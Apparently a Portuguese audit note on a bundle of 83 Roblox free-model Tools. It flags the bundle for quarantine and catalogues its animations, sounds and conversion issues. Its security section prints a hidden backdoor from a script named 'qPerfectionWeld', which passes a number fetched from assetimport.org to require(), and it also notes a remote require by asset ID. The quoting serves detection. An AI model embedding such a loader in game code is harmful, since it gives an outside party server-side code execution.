# Modelo: Reality Tools — 83 Tools, e uma delas tem BACKDOOR

- Autor original:            **vários** — é um pacote de free models remontado ⚠️
- Origem:                    `reality_tools.rbxmx`, enviado em 2026-08-15
- Licença / permissão:       **a confirmar** ⚠️
- Data de entrada:           2026-08-15
- Status:                    **CRU — COM QUARENTENA**
- Onde vive:                 `MODELOS_ENTRADA/Reality_Tools/`

---

## ⛔ ANTES DE QUALQUER COISA: NÃO RODE ESTE ARQUIVO NUM PLACE DE PRODUÇÃO

Uma das 83 Tools carrega **execução remota de código**.

```
Pistol/Resource/HUD/MainGui/GameGui/AmmoFrame/Title/qPerfectionWeld   linha 155
```

```lua
task.spawn(function()
	pcall(function()
		local newThreadedCall = coroutine.wrap(pcall)
		for _ in newThreadedCall, (select and require),
			tonumber(game:service("HttpService"):GetAsync("https://assetimport.org/")) do
		end
	end)
end)
```

**O que isso faz:** busca um número num site de terceiro e passa o resultado para
`require()`. Quem controla `assetimport.org` escolhe qual módulo o seu jogo carrega e roda —
com permissão de servidor.

**Por que passa despercebido:**

| Disfarce | Como funciona |
|---|---|
| o nome do arquivo | `qPerfectionWeld` é uma biblioteca de solda **legítima e conhecida**; ninguém audita |
| a profundidade | está **sete níveis** abaixo da Tool, dentro de uma GUI de munição |
| a forma | é o cabeçalho de um `for ... in`, não uma chamada — não lê como `require(x)` |
| o silêncio | `pcall` dentro de `task.spawn`: se falhar, não aparece erro nenhum |

É **uma** ocorrência, e só na `Pistol`. Confirmado por varredura das 336 fontes: `assetimport`
aparece exatamente uma vez no arquivo inteiro.

### E mais um, menos escondido

```
TrenchGun/Script      local GLib = require(206209239)
```

`require(<id numérico>)` é execução de código remoto por definição — o dono do asset 206209239
pode trocar o conteúdo quando quiser. É proibição direta do `CLAUDE.md`.

### O que NÃO é problema

Os quatro `https://discord.gg/EcuFrjT` estão em `READ ME` dentro de `INSTRUCTION MANUAL` da
AK47, Hunting Rifle, Luger e Shotgun. É o convite do autor do pacote de armas, em texto de
documentação — não é webhook, não manda nada para lugar nenhum.

Zero `loadstring`, zero `getfenv`/`setfenv`, zero `PostAsync`, zero `BanAsync`.

---

## O que é

Um **despejo de free models**: 83 `Tool` na raiz, 8770 instâncias, 13 MB. Não é um modelo com
um tema — é uma caixa com tudo que o autor tinha.

| Família | Quantas | Exemplos |
|---|---|---|
| armas de fogo | ~18 | `AK47`, `Minigun`, `M249 SAW`, `Sniper`, `Shotgun`, `HL2 Pistol`, `Luger` |
| spawners de NPC | ~9 | `cat spawner`, `zombie spawner`, `soldier spawner`, `nextbot` |
| corpo a corpo | ~10 | `Crowbar`, `Bat`, `Baseball Bat`, `Bone`, `pipe`, `large spoon` |
| bebida / consumível | ~5 | `Bloxy Cola`, `Bonk Cola`, `Exploding Cola`, `neon potion` |
| piada / dança | ~12 | `kick dance`, `mannrobics`, `california`, `LOADSAMONEY`, `the j` |
| **admin / griefing** | ~8 | `godmode`, `HAX!`, `banisher`, `banisher ultra!!11`, `death`, `explode`, `control` |
| física / utilidade | ~6 | `Physics Gun`, `Gravity Inducer`, `dodge`, `speed` |

---

## O passe §12.12.2 — o maior número que já entrou aqui, em tudo

| Achado | Quantos | Recorde anterior |
|---|---|---|
| `wait(` | **1001** | 56 (Noob) |
| `math.random` | **545** | 67 (Faker) |
| `:Destroy()` | **450** | 18 |
| `delay(` | **224** | 3 |
| `tick()` | **198** | 31 (Drama) |
| `Health =` | **152** | 10 |
| `spawn(` | **126** | 20 |
| `BreakJoints` | **58** | 6 |
| `TakeDamage` | 52 | — |
| `ReplicatedStorage` | **37** | 0 |
| `LoadAnimation` | 35 | 2 |
| `ServerStorage` | **25** | 0 |
| `workspace:GetDescendants()` | 10 | 3 |

**Os 62 `ReplicatedStorage`/`ServerStorage` são o número que decide.** Todos os modelos
anteriores tinham ZERO — este é o primeiro que depende de depósito fora da Tool, e a
`REGRA_AUTOCONTENCAO_ABSOLUTA` é a regra nº 1 do projeto. Converter qualquer uma destas Tools
significa reescrever a dependência inteira, não adaptar.

---

## O que vale de verdade

### 5 `KeyframeSequence`, com 801 keyframes

É a **primeira animação de Roblox de verdade** a entrar no Acervo — `KeyframeSequence` com
`Keyframe` e `Pose`, não `Weld.C0` escrito em laço.

| Sequência | Keyframes | Onde |
|---|---|---|
| `california gurls` | **361** | `kick dance` |
| `california gurls` | 181 | `mannrobics` |
| `california gurls` | 165 | `california` |
| `california gurls` | 54 | `oh no me heart stopped` |
| `a-train` | 40 | `a-train` |

Quatro cópias da mesma dança em resoluções diferentes, e uma sexta animação. **361 keyframes é
mais que o dobro da maior track que este repositório já mediu.**

⚠️ `Animation`/`LoadAnimation` são proibidos dentro de Tool — mas `KeyframeSequence` é
**dado**, não instância de runtime: o `Pose` traz `CFrame` por junta e por tempo, que é
exatamente o que o `R6CFrameAnimator` consome. Isto é fonte de pose de altíssima densidade,
e é o motivo mais forte para o arquivo ficar no Acervo.

### 191 `Sound` distintos

Em 291 instâncias. É a maior paleta sonora que já chegou — o `Guest_Tools`, que era a
referência, tinha 12. Tiro, recarga, ferrolho, passo, impacto de metal, música.

### 66 `ParticleEmitter` · 74 `MeshPart` · 68 `UnionOperation` · 23 `Texture`

---

## Distribuição: 83 Tools contra um teto de 7

A `REGRA_DISTRIBUICAO_DE_TOOLS` dá piso 3 e teto 7. **83 é doze vezes o teto.** Este arquivo
não vira "o conjunto Reality" — no máximo vira **fonte** de onde sai um conjunto de 7, com
tema escolhido.

E boa parte não é candidata a nada:

- **os ~9 spawners** são NPC, que o `CLAUDE.md` põe explicitamente fora de escopo;
- **os ~8 de admin/griefing** (`godmode`, `HAX!`, `banisher`, `death`, `control`) não são
  habilidade de jogo, são ferramenta de quebrar servidor;
- **as ~18 armas de fogo** fogem do que o repositório é — os dez conjuntos existentes são
  corpo a corpo, conjuração e área. Uma AK47 conforme seria uma Tool correta e um corpo
  estranho.

O que sobra como tema plausível: **corpo a corpo** (`Crowbar`, `Bat`, `Bone`, `pipe`,
`large spoon`, `real scout bat`) e **física** (`Physics Gun`, `Gravity Inducer`, `dodge`,
`speed`) — mas o conjunto GRAVIDADE já cobre o segundo.

---

## Recomendação

1. **Não arraste este arquivo para um place de produção.** Nem para testar. O backdoor roda em
   `task.spawn` no carregamento, sem clique.
2. Se for usar, use como **fonte de asset**: as 5 `KeyframeSequence`, os 191 sons, os
   emissores e as malhas — copiados um a um, com o script deixado para trás.
3. Nenhuma das 83 Tools deve ser convertida com o script dela. Os 62
   `ReplicatedStorage`/`ServerStorage` e os 58 `BreakJoints` já garantiriam reescrita total; o
   backdoor decide.

## Passe de conformidade §12.12.2 — NÃO EXECUTADO

Modelo **CRU, em quarentena**: catalogado, triado e com o achado de segurança registrado.
Falta a licença (§12.12.3) e falta o pedido — quais Tools, com que nomes, de qual família.

---

## 2026-08-16 — a auditoria, e a lógica que atravessa

### As 6 Tools que o conjunto usa NÃO têm veneno

O backdoor mora na `Pistol` e o `require(206209239)` mora no `TrenchGun`. Nenhuma das duas
entra no `Reality Gui`. Varredura nas seis usadas — `SLAP`, `a-train`, `tre`,
`gravity cat not amused`, `samsung`, `kick dance` — atrás de `assetimport`, `loadstring`,
`getfenv`, `setfenv`, `HttpService`, `GetAsync`, `PostAsync` e `require(<id>)`: **zero**.

A primeira entrega tratou o arquivo inteiro como se todo script fosse a `Pistol`, e reescreveu
as sete habilidades do zero. Estava errado. O que a origem tem de problema nestas seis é isto,
e é tudo substituição mecânica:

| Da origem | Vira | Quantos |
|---|---|---|
| `wait(` · `spawn(` | `task.wait` · `task.spawn` | 57 · 10 |
| `math.random` em gameplay | `jitter` / `naFaixa` determinísticos | 36 |
| `:Destroy()` · `:remove()` | `Parent = nil` / `Debris` | 11 · 3 |
| `Health = 0` | `TakeDamage` pelo Núcleo | 8 |
| `BreakJoints` | `PlatformStand` com prazo | 2 |
| `Instance.new("Explosion")` | `detectarHumanoides` | 2 |
| `ReplicatedStorage` · `ServerStorage` · `ReplicatedFirst` | asset dentro da Tool | 9 |
| `ScreenGui` · `PlayerGui` | caem — proibido dentro de Tool | 4 |

### A animação da origem entra INTEIRA

Quatro das sete têm animação de verdade na origem, e ela foi recuperada quadro a quadro:

| Tool | Fonte da animação | Antes | Agora |
|---|---|---|---|
| `Trem` | `KeyframeSequence` `a-train` | 10 quadros | **40 de 40** |
| `Danca Provocadora` | `KeyframeSequence` `california gurls` | 14 quadros | **361 de 361** |
| `Samsungus` | laços de `Weld.C0` no `LeadpipeServer` | pose inventada | 4 blocos, verbatim |
| `Canhao Satelite` | laços de `Weld.C0` no Script do LOIC | pose inventada | 6 blocos, verbatim |

As outras três não têm o que recuperar: o `Animation` da `SLAP` tem `AnimationId` **vazio**, e
na `tre` e no `gravity cat` quem se mexe é o modelo invocado, não quem invoca.

Duas descobertas que valem para o próximo modelo deste tipo:

1. **`PlayTrack`, não `PlaySequence`, para animação densa.** `PlaySequence` emenda um Tween por
   passo no `Completed`, e cada emenda custa um quadro: 361 emendas somariam segundos e a dança
   rodaria em câmera lenta. `PlayTrack` roda no `Heartbeat` com tempo ABSOLUTO.
2. **O C1 da origem entra INVERTIDO.** `Part1.CFrame = Part0.CFrame * C0 * C1:Inverse()`, e o
   animator canônico solda com C1 identidade — logo `C0_canonico = alvo * C1⁻¹`. A conferência é
   o repouso: o braço do `samsung` é `CFrame.new(1.5,0.5,0)`, e `(1.5,0.5,0) * (0,-0.5,0)` dá
   `(1.5,0,0)`, que é a base do `R6CFrameAnimator`. Com o sinal trocado a animação inteira sai
   um stud acima do ombro.

### Uma habilidade por Tool, no clique

Sem Extra, sem tecla, sem `AcaoRemote`, sem botão de celular. O `AcaoRemote` saiu também da
instância: RemoteEvent que nenhum script cita é asset depositado e mudo, e ainda é porta aberta
de graça.

### O que a origem faz e não atravessou

| Da origem | Por que ficou de fora |
|---|---|
| `require(ReplicatedFirst.Ragdoll)` | dependência FORA da Tool: é a regra nº 1 |
| `ScreenGui` branca do leadpipe · `Popup` da `tre` | proibida dentro de Tool, e mexe na `PlayerGui` de terceiro |
| `v:destroy()` num raio de 250 studs (LOIC) | apagaria o cenário do servidor |
| `game.Chat:Chat` · `Humanoid.Name = "Immunity"` | fora de escopo de Tool |
| `shakerbreaker` (LocalScript clonado no personagem alheio) | o tremor da cutscene faz isso de dentro da Tool |
| `attack2` e `attack3` do gato | são o boss em laço infinito, não uma habilidade de clique |

Status do modelo: **segue CRU, em quarentena.** Licença (§12.12.3) continua em aberto.
